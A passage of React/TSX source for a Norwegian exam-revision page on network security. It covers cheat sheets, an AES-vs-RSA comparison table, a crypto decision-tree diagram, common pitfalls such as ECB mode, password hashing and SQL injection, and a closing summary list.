      <text x={260} y={250} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Verdien tolkes som ren streng — kan ikke endre spørringens struktur
      </text>

      <defs>
        <marker id="sqi" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-destructive" />
        </marker>
      </defs>
    </svg>
  );
}

// ===========================================================================
// SectionEksamen — kompakt eksamen-fokus for kap. 8 (Sikkerhet i nettverk)
// ===========================================================================

function SectionEksamen() {
  return (
    <div className="space-y-6">
      <Header num="8.11" title="Eksamen-fokus — sikkerhet på 30 minutter" />

      <p className="text-[13px] text-muted-foreground">
        Dette er det største kapittelet i Kurose, så denne siden er ekstra omfattende. Bruk den til
        siste-natt-repetisjon: les cheat-arket først, gå gjennom sammenligningen og
        beslutningstreet, sjekk at du gjenkjenner alle fallgruvene, og avslutt med
        5-minutter-ankeret rett før eksamenslokalet.
      </p>

      {/* ============ A) CHEAT SHEET ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">a) Cheat sheet — alt på ett brett</h3>

        <div className="grid md:grid-cols-2 gap-3">
          <Cheat tittel="Sikkerhets-mål (CIA + 2)">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>C</strong>onfidentiality — kun mottaker leser. Verktøy: kryptering.
              </li>
              <li>
                <strong>I</strong>ntegrity — meldingen er uendret. Verktøy: hash, MAC, signatur.
              </li>
              <li>
                <strong>A</strong>vailability — tjenesten svarer. Verktøy: redundans, rate-limit,
                DDoS-mitigering.
              </li>
              <li>
                <strong>Authenticity</strong> — du snakker med rett part. Verktøy: signatur,
                sertifikat, MAC.
              </li>
              <li>
                <strong>Non-repudiation</strong> — avsender kan ikke benekte etterpå. Krever
                <em> digital signatur</em> (MAC holder ikke, for begge parter har nøkkelen).
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="Symmetrisk vs. asymmetrisk">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>Symmetrisk</strong> (AES, ChaCha20): én delt nøkkel. Raskt, små nøkler
                (128/256 bit). Problem: hvordan dele nøkkelen først?
              </li>
              <li>
                <strong>Asymmetrisk</strong> (RSA, ECC): nøkkelpar (offentlig + privat). Treigt,
                store nøkler (2048+ bit RSA, 256 bit ECC). Løser nøkkel-fordeling.
              </li>
              <li>
                <strong>Hybrid</strong> (i praksis alltid): bruk asym for å avtale en sym
                økt-nøkkel, krypter all data symmetrisk.
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="AES-modi">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>ECB</strong> — krypterer hver blokk uavhengig. Like klartekst-blokker gir
                like chiffer-blokker → mønstre lekker. <em>Aldri</em> bruk på ekte data.
              </li>
              <li>
                <strong>CBC</strong> — hver blokk XORes med forrige chiffer. Trenger IV. Sekvensiell
                kryptering (kan ikke parallelliseres).
              </li>
              <li>
                <strong>CTR</strong> — gjør AES om til en strøm-chiffer ved å kryptere en teller.
                Parallelliserbar, ingen padding.
              </li>
              <li>
                <strong>GCM</strong> — CTR + GMAC. <em>AEAD</em>: gir konfidensialitet OG
                autentisering i én operasjon. Standard-valg i moderne TLS.
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="Hash-funksjons-egenskaper">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>Preimage-resistens</strong>: gitt h, vanskelig å finne m så H(m) = h.
              </li>
              <li>
                <strong>Second-preimage</strong>: gitt m₁, vanskelig å finne m₂ ≠ m₁ med samme hash.
              </li>
              <li>
                <strong>Collision-resistens</strong>: vanskelig å finne <em>noe</em> par (m₁, m₂)
                med kollisjon. Brytes først (bursdags-paradokset → 2^(n/2)-arbeid).
              </li>
              <li>
                SHA-256: 256 bit output → kollisjons-sikkerhet ≈ 2^128. SHA-1 og MD5 er knust.
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="HMAC — formelen">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <code className="text-[11px]">HMAC(K, m) = H((K ⊕ opad) ‖ H((K ⊕ ipad) ‖ m))</code>
              </li>
              <li>
                <em>opad</em> = 0x5c gjentatt til blokk-størrelse, <em>ipad</em> = 0x36 gjentatt.
              </li>
              <li>Dobbelt-hash for å hindre length-extension-angrep mot Merkle–Damgård-hashene.</li>
              <li>Gir autentisitet + integritet (men IKKE ikke-avvisning — begge har K).</li>
            </ul>
          </Cheat>

          <Cheat tittel="TLS 1.3-håndtrykk (1-RTT)">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>1. ClientHello</strong> — versjon, cipher-suites, <em>key_share</em>{" "}
                (DH-offentlig nøkkel), random.
              </li>
              <li>
                <strong>2. ServerHello</strong> — valgt suite, server-key_share, +{" "}
                <em>{`{Certificate, CertificateVerify, Finished}`}</em> kryptert under HS-secret.
              </li>
              <li>
                <strong>3. Klient sender Finished</strong> — håndtrykk verifisert, applikasjons-data
                kan flyte umiddelbart.
              </li>
              <li>Hovedforskjell fra 1.2: kun 1 RTT, all server-respons unntatt SH er kryptert.</li>
            </ul>
          </Cheat>

          <Cheat tittel="IPsec — ESP vs. AH">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>ESP</strong> (Encapsulating Security Payload) — krypterer + autentiserer
                payload. Brukes i 99% av VPN-er.
              </li>
              <li>
                <strong>AH</strong> (Authentication Header) — kun autentisering av hele pakken
                (inkl. ytre header). Ingen kryptering. Brytes av NAT.
              </li>
              <li>
                <strong>Transport-modus</strong>: krypterer payload, beholder original IP-header
                (host-to-host).
              </li>
              <li>
                <strong>Tunnel-modus</strong>: krypterer hele original IP-pakke, ny ytre header
                (site-to-site VPN).
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="Brannmur-typer">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>Packet-filter (stateless)</strong>: vurderer hver pakke alene mot regler på
                IP/port/protokoll. Ingen minne om TCP-tilstand.
              </li>
              <li>
                <strong>Stateful</strong>: holder conntrack-tabell (5-tuple → tilstand). Tillater
                returtrafikk automatisk når intern part initierer.
              </li>
              <li>
                <strong>Application gateway (proxy)</strong>: ser på lag-7-data. Kan blokkere
                bestemte HTTP-metoder eller filtrere innhold.
              </li>
              <li>
                <strong>WAF</strong> ≠ brannmur — er en spesialisert app-gateway for web (SQLi-,
                XSS-mønstre).
              </li>
            </ul>
          </Cheat>

          <Cheat tittel="IDS / IPS — angreps-deteksjon">
            <ul className="list-disc pl-5 space-y-1">
              <li>
                <strong>IDS</strong> = Intrusion Detection System — <em>varsler</em> (passiv,
                out-of-band, ofte SPAN-port).
              </li>
              <li>
                <strong>IPS</strong> = Intrusion Prevention System — <em>blokkerer</em> (inline, må
                være rask nok til linjehastighet).
              </li>
              <li>
                <strong>Signatur-basert</strong>: matcher mot kjente mønstre (Snort-regler). Lav
                false-positive, savner zero-days.
              </li>
              <li>
                <strong>Anomali-basert</strong>: lærer normal-profil, varsler ved avvik. Fanger
                ukjent, men plages av false-positives.
              </li>
              <li>
                Husk: <em>false positive</em> = falsk alarm; <em>false negative</em> = mistet
                angrep.
              </li>
            </ul>
          </Cheat>
        </div>
      </section>

      {/* ============ A.2) VISUELLE ANKER FOR CHEAT-ARKET ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">
          a.2) Visuelle anker — det samme på et blikk
        </h3>
        <p className="text-[12px] text-muted-foreground">
          Bullet-listene over er presise, men trege å laste inn rett før eksamen. Her er de samme
          fakta som diagrammer du kan dra opp i hodet på sekunder.
        </p>
        <div className="grid md:grid-cols-2 gap-3">
          <Illustration caption="CIA-triaden som Venn — tre uavhengige mål, ulike verktøy.">
            <CiaVennSvg />
          </Illustration>
          <Illustration caption="AES-modi: ECB lekker, GCM er førstevalg (AEAD).">
            <AesModesSvg />
          </Illustration>
          <Illustration caption="HMAC: inner+outer hash stopper length-extension.">
            <HmacInnerOuterSvg />
          </Illustration>
          <Illustration caption="IPsec ESP+AH pakke-struktur — hva som krypteres, hva som autentiseres.">
            <EspPacketLayoutSvg />
          </Illustration>
          <Illustration caption="Tre brannmur-typer — hvor høyt opp i stacken de ser.">
            <FirewallStacksSvg />
          </Illustration>
          <Illustration caption="IDS-utfall som confusion-matrix — TP/FP/FN/TN.">
            <IdsConfusionMatrixSvg />
          </Illustration>
        </div>
      </section>

      {/* ============ B) SAMMENLIGNING — AES vs RSA ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">b) AES vs. RSA — side-ved-side</h3>
        <div className="rounded-xl border border-border bg-card overflow-x-auto">
          <table className="w-full text-[12px]">
            <thead>
              <tr className="border-b border-border bg-muted/20">
                <th className="px-3 py-2 text-left font-semibold">Egenskap</th>
                <th className="px-3 py-2 text-left font-semibold text-brand">AES</th>
                <th className="px-3 py-2 text-left font-semibold text-amber-700 dark:text-amber-400">
                  RSA
                </th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              <tr>
                <td className="px-3 py-2 font-medium">Type</td>
                <td className="px-3 py-2 text-muted-foreground">
                  Symmetrisk blokk-chiffer (128-bit blokker)
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  Asymmetrisk (offentlig + privat nøkkel)
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Hastighet</td>
                <td className="px-3 py-2 text-muted-foreground">
                  Svært rask (GB/s med AES-NI i CPU)
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  ~1000× tregere; tunge modulo-eksponentiasjoner
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Nøkkellengde</td>
                <td className="px-3 py-2 text-muted-foreground">128, 192 eller 256 bit</td>
                <td className="px-3 py-2 text-muted-foreground">
                  ≥ 2048 bit (3072 anbefalt etter 2030)
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Sikkerhets-margin</td>
                <td className="px-3 py-2 text-muted-foreground">
                  AES-128 ≈ 2^128 arbeid; ingen praktisk angrep
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  RSA-2048 ≈ 2^112 arbeid; sårbart for kvante (Shor)
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Datamengde per operasjon</td>
                <td className="px-3 py-2 text-muted-foreground">
                  Ubegrenset (i en strøm-modus som CTR/GCM)
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  Begrenset til ~ nøkkel-størrelse (255 byte for 2048-bit)
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Hovedbruk</td>
                <td className="px-3 py-2 text-muted-foreground">
                  Bulk-kryptering av data (TLS records, disk, VPN-payload)
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  Nøkkel-transport, signaturer, sertifikater
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Rolle i nøkkel-utveksling</td>
                <td className="px-3 py-2 text-muted-foreground">
                  Forbrukeren — får økt-nøkkel utlevert
                </td>
                <td className="px-3 py-2 text-muted-foreground">
                  Leverandøren — krypterer/signerer for å avtale økt-nøkkel
                </td>
              </tr>
              <tr>
                <td className="px-3 py-2 font-medium">Vanlig modus i praksis</td>
                <td className="px-3 py-2 text-muted-foreground">AES-GCM (AEAD)</td>
                <td className="px-3 py-2 text-muted-foreground">
                  RSA-OAEP (krypt), RSA-PSS (signering)
                </td>
              </tr>
            </tbody>
          </table>
        </div>
        <p className="text-[11px] text-muted-foreground italic">
          Konklusjon: AES og RSA er ikke konkurrenter — de er komplementære. Hybride protokoller som
          TLS bruker RSA (eller ECDH) til å avtale en AES-nøkkel, så krypterer all videre trafikk
          med AES-GCM.
        </p>
      </section>

      {/* ============ C) BESLUTNINGSTRE ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">
          c) Beslutningstre — «hvilken krypto-tilnærming?»
        </h3>
        <Illustration caption="Følg svarene på spørsmålene fra rot til blad for å lande på riktig primitiv.">
          <KryptoBeslutningSvg />
        </Illustration>
        <p className="text-[12px] text-muted-foreground">
          Treet dekker de 6 mest vanlige eksamen-scenarioene: kun konfidensialitet (sym), integritet
          uten avsender-binding (HMAC), ikke-avvisning (signatur), nøkkel-utveksling over usikker
          kanal (DH eller RSA-OAEP), passord-lagring (KDF), og full kanal-sikkerhet (TLS/hybrid).
        </p>
      </section>

      {/* ============ D) FALLGRUVER ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">
          d) Vanlige fallgruver — det sensor leter etter
        </h3>
        <div className="grid md:grid-cols-2 gap-3">
          <Fallgruve tittel="ECB lekker mønstre — aldri bruk på ekte data">
            ECB krypterer hver 16-byte-blokk uavhengig. Like klartekst-blokker gir like
            chiffer-blokker, så et bilde forblir gjenkjennelig etter «kryptering». Bruk{" "}
            <strong>CBC, CTR eller GCM</strong> i stedet. Klassisk eksempel: ECB-Penguin.
          </Fallgruve>

          <Fallgruve tittel="Hash er IKKE kryptering">
            En hash-funksjon er <em>enveis</em> — du kan ikke «dekryptere» SHA-256. Å si «vi
            krypterer passordene med SHA-256» avslører misforståelse. Riktig formulering: «vi lagrer
            en salt+KDF-hash av passordet».
          </Fallgruve>

          <Fallgruve tittel="Sertifikat ≠ nøkkel">
            Et X.509-sertifikat er en signert binding mellom identitet (CN/SAN) og en{" "}
            <strong>offentlig</strong> nøkkel. Den private nøkkelen ligger på serveren, aldri i
            sertifikatet. Når du «installerer et sertifikat», deler du faktisk to filer: pem-
            sertifikatet (offentlig) og en privat .key (hemmelig).
          </Fallgruve>

          <Fallgruve tittel="Perfect Forward Secrecy — bytt nøkkel hver økt">
            Hvis serveren bruker statisk RSA-nøkkel og noen lagrer chiffertrafikken, kan en
            framtidig kompromittert privat-nøkkel dekryptere all historisk trafikk. Løsning:{" "}
            <strong>ephemeral Diffie–Hellman (DHE / ECDHE)</strong> — ny nøkkel hver handshake,
            gamle øktene forblir trygge selv om RSA-nøkkelen lekker.
          </Fallgruve>

          <Fallgruve tittel="SQL-injection løses med parametriserte queries">
            Escape-funksjoner er feil verktøy — de kan glipp av kant-tilfeller (multibyte,
            kommentar-syntaks). <strong>Parametriserte queries / prepared statements</strong>{" "}
            skiller kode (mal) fra data (binding) på protokoll-nivå — verdier kan aldri ende opp som
            SQL-syntaks.
          </Fallgruve>

          <Fallgruve tittel="HTTPS er ikke ett protokoll — det er en stack">
            HTTPS = HTTP over TLS over TCP over IP. TLS sikrer kanalen; HTTP-meldingene flyter
            uendret inne i den. En vanlig feil er å tro at «HTTPS krypterer URL-en helt» — DNS-
            spørringen, IP-adressen og SNI-feltet er fortsatt synlige.
          </Fallgruve>

          <Fallgruve tittel="Passord-hashing trenger salt OG en treig KDF">
            Bare SHA-256 av passordet er knust på minutter med GPU-er. Du trenger:{" "}
            <strong>(a) unik salt per passord</strong> (forhindrer rainbow-tables) og{" "}
            <strong>(b) en bevisst treig KDF</strong> som argon2id, bcrypt eller scrypt (gjør hver
            gjetning kostbar).
          </Fallgruve>

          <Fallgruve tittel="WAF ≠ brannmur">
            En brannmur ser på pakker (lag 3–4); en Web Application Firewall ser på HTTP-innhold
            (lag 7) og kjenner SQLi/XSS-mønstre. De løser ulike problem og er supplementer, ikke
            erstatninger.
          </Fallgruve>

          <Fallgruve tittel="IDS varsler, IPS blokkerer">
            Et IDS er passivt (out-of-band, ofte på en SPAN-port). Et IPS sitter inline og kan
            droppe pakker. Bytter du IDS til IPS uten å håndtere false-positives, risikerer du å
            dropp legitim trafikk og lage incidentkø.
          </Fallgruve>

          <Fallgruve tittel="MAC gir ikke ikke-avvisning">
            En MAC bruker en delt nøkkel, så <em>begge</em> parter kan ha laget den — du kan ikke
            bevise overfor en tredjepart hvem som signerte. Trenger du ikke-avvisning, må du bruke{" "}
            <strong>digital signatur</strong> med privat nøkkel.
          </Fallgruve>

          <Fallgruve tittel="Diffie–Hellman gir konfidensialitet, ikke autentisitet">
            Ren DH er åpen for <em>man-in-the-middle</em>: Mallory kjører DH med Alice og DH med Bob
            hver for seg. Derfor må DH-eksponenten signeres med en autentisert privat nøkkel
            (sertifikat-kjede), eller du må bruke en pre-shared key.
          </Fallgruve>

          <Fallgruve tittel="Nonce / IV skal aldri gjenbrukes">
            For CTR og GCM betyr gjenbruk av (nøkkel, nonce)-par at angriper kan XOR-e to
            chiffertekster og fjerne nøkkelen — total catastrophe. For ECDSA gir gjenbruk av k ut
            den private nøkkelen direkte (kjent fra Sony PS3).
          </Fallgruve>
        </div>

        {/* Visuelle fallgruve-illustrasjoner */}
        <div className="grid md:grid-cols-2 gap-3 pt-2">
          <Illustration caption="HTTPS er en stack — DNS, IP og SNI lekker selv om TLS krypterer HTTP-en.">
            <HttpsStackSvg />
          </Illustration>
          <Illustration caption="Passord-lagring: ren SHA-256 faller på timer; salt + argon2id gjør hver gjetning kostbar.">
            <SaltKdfSvg />
          </Illustration>
          <Illustration caption="WAF og brannmur ser ulike lag — supplementer, ikke erstattere.">
            <WafVsFirewallSvg />
          </Illustration>
          <Illustration caption="XSS · CSRF · SQLi: tre angrep, samme grunnfeil — input tolkes som kode i feil kontekst.">
            <WebAttacksFlowSvg />
          </Illustration>
        </div>
      </section>

      {/* ============ E) 5-MINUTTER-ANKER ============ */}
      <section className="space-y-3">
        <h3 className="text-sm font-semibold text-foreground">
          e) 5-minutter-anker — siste sjekk før du leverer
        </h3>
        <Anker>
          <li>
            <strong>CIA</strong>: Confidentiality (krypt), Integrity (hash/MAC), Availability
            (redundans). Pluss Authenticity og Non-repudiation.
          </li>
          <li>
            <strong>Symmetrisk = én nøkkel, raskt</strong> (AES).{" "}
            <strong>Asymmetrisk = to nøkler, treigt</strong> (RSA/ECC). Hybrid i praksis: asym
            avtaler sym økt-nøkkel.
          </li>
          <li>
            <strong>AES-modi</strong>: ECB usikker, CBC trenger IV, CTR parallell, GCM = AEAD
            (krypt+autent i ett).
          </li>
          <li>
            <strong>Hash-egenskaper</strong>: preimage, second-preimage, collision-resistans.
            SHA-256 er gullstandard; MD5 og SHA-1 er knust.
          </li>
          <li>
            <strong>HMAC</strong> bygger MAC av en hash + delt nøkkel. Husk dobbelt-hash-strukturen
            (opad, ipad).
          </li>
          <li>
            <strong>Digital signatur</strong> = hash(m) kryptert med privat nøkkel. Eneste primitiv
            som gir <em>ikke-avvisning</em>.
          </li>
          <li>
            <strong>Diffie–Hellman</strong> avtaler delt hemmelighet over usikker kanal. Trenger
            autentisering på toppen for å unngå MITM.
          </li>
          <li>
            <strong>X.509-sertifikat</strong> = signert binding av (identitet, offentlig nøkkel) fra
            en CA. Kjede valideres til en trust anchor i klientens nøkkelring.
          </li>
          <li>
            <strong>TLS 1.3-håndtrykk</strong>: 1-RTT, alt etter ServerHello er kryptert. ECDHE gir
            Perfect Forward Secrecy.
          </li>
          <li>
            <strong>IPsec</strong>: ESP (krypt+auth, oftest brukt) vs AH (kun auth, brytes av NAT).
            Transport-modus host-til-host, tunnel-modus site-to-site.
          </li>
          <li>
            <strong>Brannmur</strong>: stateless (regler per pakke), stateful (conntrack),
            app-gateway/proxy (lag-7). WAF er en spesialisert app-gateway for web.
          </li>
          <li>
            <strong>IDS vs IPS</strong>: IDS varsler (passiv), IPS blokkerer (inline). Signatur-
            (kjente angrep) vs anomali- (avvik fra normal) basert.
          </li>
          <li>
            <strong>SQL-injection</strong> → parametriserte queries. <strong>XSS</strong> →
            kontekstuell utgang-escaping + CSP. <strong>CSRF</strong> → SameSite-cookies eller
            anti-CSRF-token.
          </li>
          <li>
            <strong>Passord-lagring</strong>: per-bruker salt + argon2id/bcrypt/scrypt. Aldri ren
            SHA.
          </li>
          <li>
            <strong>HTTPS-stack</strong>: HTTP ⊂ TLS ⊂ TCP ⊂ IP. DNS og SNI er fortsatt synlige.
          </li>
          <li>
            <strong>Nonce/IV</strong> aldri gjenbruk under samme nøkkel — gjelder GCM, CTR, ECDSA
            (k-verdi).
          </li>
          <li>
            <strong>Kvanteresistens</strong>: AES-256 og SHA-384 overlever Grover; RSA og ECC faller
            for Shor. Post-quantum (ML-KEM, ML-DSA) er på vei inn i TLS.
          </li>
        </Anker>
      </section>
    </div>
  );
}

// ===========================================================================
// Helpers — Fallgruve, Cheat, Anker
// ===========================================================================

function Fallgruve({ tittel, children }: { tittel: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-destructive/30 bg-destructive/5 p-3.5">
      <div className="text-[10px] uppercase tracking-wider text-destructive font-semibold mb-1">
        Fallgruve
      </div>
      <div className="font-semibold text-foreground text-[13px] mb-1">{tittel}</div>
      <div className="text-[12.5px] text-muted-foreground leading-relaxed">{children}</div>
    </div>
  );
}

function Cheat({ tittel, children }: { tittel: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-brand/30 bg-brand/5 p-3.5">
      <div className="text-[10px] uppercase tracking-wider text-brand font-semibold mb-1.5">
        Cheat
      </div>
      <div className="font-semibold text-foreground text-[13px] mb-1.5">{tittel}</div>
      <div className="text-[12.5px] text-muted-foreground leading-relaxed">{children}</div>
    </div>
  );
}

function Anker({ children }: { children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-success/30 bg-success/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-success font-semibold mb-2">
        5-minutter-anker
      </div>
      <ol className="list-decimal pl-5 space-y-1.5 text-[12.5px] text-muted-foreground">
        {children}
      </ol>
    </div>
  );
}

// ===========================================================================
// Beslutningstre-SVG: «Hvilken krypto-primitiv?»
// ===========================================================================

function KryptoBeslutningSvg() {
  // Tre-noder (12 stk): 1 rot + 4 spørsmål + 7 blad
  const Q = "fill-card stroke-brand"; // spørsmål-noder
  const L = "fill-success/10 stroke-success"; // blad / primitiv
  return (
    <svg
      viewBox="0 0 920 520"
      className="w-full h-auto"
      aria-label="Beslutningstre for krypto-valg"
    >
      {/* Rot */}
      <rect x={360} y={10} width={200} height={48} rx={8} className={Q} strokeWidth={1.5} />
      <text
        x={460}
        y={32}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hva trenger du?
      </text>
      <text x={460} y={48} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (start)
      </text>

      {/* Nivå 1 — 4 hovedgrener */}
      <rect x={20} y={110} width={180} height={56} rx={8} className={Q} strokeWidth={1.5} />
      <text
        x={110}
        y={134}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Trenger du å sende
      </text>
      <text
        x={110}
        y={150}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        nøkkel over usikker kanal?
      </text>

      <rect x={230} y={110} width={180} height={56} rx={8} className={Q} strokeWidth={1.5} />
      <text
        x={320}
        y={134}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Trenger du at avsender
      </text>
      <text
        x={320}
        y={150}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        ikke kan benekte?
      </text>

      <rect x={440} y={110} width={180} height={56} rx={8} className={Q} strokeWidth={1.5} />
      <text
        x={530}
        y={134}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Bare integritet med
      </text>
      <text
        x={530}
        y={150}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        delt hemmelighet?
      </text>

      <rect x={650} y={110} width={180} height={56} rx={8} className={Q} strokeWidth={1.5} />
      <text
        x={740}
        y={134}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Lagre passord
      </text>
      <text
        x={740}
        y={150}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        sikkert?
      </text>

      {/* Linjer rot → nivå 1 */}
      <line
        x1={460}
        y1={58}
        x2={110}
        y2={110}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      <line
        x1={460}
        y1={58}
        x2={320}
        y2={110}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      <line
        x1={460}
        y1={58}
        x2={530}
        y2={110}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      <line
        x1={460}
        y1={58}
        x2={740}
        y2={110}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />

      {/* Nivå 2 — blader */}
      {/* Fra «nøkkel-utveksling» → 2 blad: DH eller RSA-OAEP */}
      <rect x={10} y={230} width={120} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={70}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        DH / ECDHE
      </text>
      <text x={70} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (forward secrecy)
      </text>

      <rect x={140} y={230} width={120} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={200}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        RSA-OAEP
      </text>
      <text x={200} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (klassisk)
      </text>

      <line
        x1={110}
        y1={166}
        x2={70}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      <line
        x1={110}
        y1={166}
        x2={200}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />

      {/* Fra «ikke-avvisning» → signatur */}
      <rect x={270} y={230} width={150} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={345}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Digital signatur
      </text>
      <text x={345} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (RSA-PSS / ECDSA / Ed25519)
      </text>

      <line
        x1={320}
        y1={166}
        x2={345}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />

      {/* Fra «integritet med delt nøkkel» → HMAC eller AEAD */}
      <rect x={440} y={230} width={120} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={500}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        HMAC
      </text>
      <text x={500} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (kun integritet)
      </text>

      <rect x={570} y={230} width={150} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={645}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        AES-GCM (AEAD)
      </text>
      <text x={645} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (krypt + integritet)
      </text>

      <line
        x1={530}
        y1={166}
        x2={500}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />
      <line
        x1={530}
        y1={166}
        x2={645}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />

      {/* Fra «passord» → KDF */}
      <rect x={730} y={230} width={180} height={50} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={820}
        y={252}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        salt + argon2id
      </text>
      <text x={820} y={268} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (bcrypt / scrypt OK)
      </text>

      <line
        x1={740}
        y1={166}
        x2={820}
        y2={230}
        className="stroke-muted-foreground"
        strokeWidth={1}
      />

      {/* Nivå 3 — «full kanal» blad nederst sentrert */}
      <rect x={335} y={420} width={250} height={56} rx={8} className={L} strokeWidth={1.5} />
      <text
        x={460}
        y={445}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        TLS / hybrid stack
      </text>
      <text x={460} y={462} textAnchor="middle" className="fill-muted-foreground text-[10px]">
        (ECDHE + sertifikat + AES-GCM)
      </text>

      {/* Forklaring nede */}
      <text
        x={460}
        y={340}
        textAnchor="middle"
        className="fill-muted-foreground text-[11px] italic"
      >
        Trenger du full kanal-sikkerhet (klient ↔ server, alt på en gang)?
      </text>
      <text
        x={460}
        y={358}
        textAnchor="middle"
        className="fill-muted-foreground text-[11px] italic"
      >
        Da kombineres alt over i én ferdig protokoll:
      </text>
      <line
        x1={460}
        y1={365}
        x2={460}
        y2={420}
        className="stroke-muted-foreground"
        strokeWidth={1}
        strokeDasharray="3,3"
      />

      {/* Tegnforklaring */}
      <g transform="translate(20, 490)">
        <rect width={14} height={14} className={Q} strokeWidth={1.2} rx={3} />
        <text x={20} y={11} className="fill-muted-foreground text-[10px]">
          Spørsmål
        </text>
        <rect x={90} width={14} height={14} className={L} strokeWidth={1.2} rx={3} />
        <text x={110} y={11} className="fill-muted-foreground text-[10px]">
          Primitiv-valg (blad)
        </text>
      </g>
    </svg>
  );
}

// ===========================================================================
// Nye illustrasjoner — kap. 8 visuelle anker
// ===========================================================================

/** 1) CIA-triad som tre-sirkel-Venn */
function CiaVennSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto" aria-label="CIA-triaden som Venn-diagram">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        CIA-triaden — tre uavhengige mål, ett nettverk
      </text>
      <circle cx={205} cy={130} r={70} className="fill-brand/15 stroke-brand" strokeWidth={1.5} />
      <circle
        cx={315}
        cy={130}
        r={70}
        className="fill-success/15 stroke-success"
        strokeWidth={1.5}
      />
      <circle
        cx={260}
        cy={195}
        r={70}
        className="fill-amber-500/15 stroke-amber-500"
        strokeWidth={1.5}
      />
      <text x={170} y={95} textAnchor="middle" className="fill-brand text-[11px] font-semibold">
        C — Confidentiality
      </text>
      <text x={170} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        kryptering
      </text>
      <text x={355} y={95} textAnchor="middle" className="fill-success text-[11px] font-semibold">
        I — Integrity
      </text>
      <text x={355} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        hash · MAC · signatur
      </text>
      <text
        x={260}
        y={245}
        textAnchor="middle"
        className="fill-amber-700 dark:fill-amber-400 text-[11px] font-semibold"
      >
        A — Availability
      </text>
